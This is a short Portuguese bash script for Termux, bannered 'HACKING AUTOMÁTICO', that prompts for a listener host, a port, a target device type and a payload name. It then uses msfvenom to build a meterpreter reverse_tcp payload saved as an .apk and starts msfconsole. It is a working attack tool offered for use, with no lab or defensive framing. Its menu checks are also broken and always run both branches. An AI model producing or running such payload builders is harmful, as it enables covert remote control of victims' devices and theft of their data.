#! /bin/bash
#
#
#
#Limpar a tela
clear
#
#BANNER
echo "#################################"
echo "#          HACKING              #"
echo "#         AUTOMÁTICO            #"
echo "#                               #"
echo "#                               #"
echo "#################################"
#
#
#Entrando na pasta do metasploit-framework
cd $HOME ; cd metasploit-framework
#

echo "1-criar payload"; sleep 2
echo "2-executar o msfconsole"; sleep 2

echo "INFORME O HOST DO SEU TERMUX:"
read -p "[+]>>" host

echo  "INFORME A PORTA QUE VOCE QUER USAR:"
read -p "[+]>>" porta

echo "INFORME O DISPOSITIVO QUE VOCE QUER HACKEAR:"
read -p "[+]>>" dispositivo

echo  "INFORME O NOME DO PAYLOAD:"
read -p "[+]>>" nome
#

if [ "$META = 1" ];then
 echo "criando payload..."; sleep 2
./msfvenom -p $dispositivo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk

echo "payload criado!"; sleep 2
fi
if [ "$META = 2" ];then 
 echo "iniciando msfconsole..."
./msfconsole
echo "msfconsole executado!"; sleep 2
fi

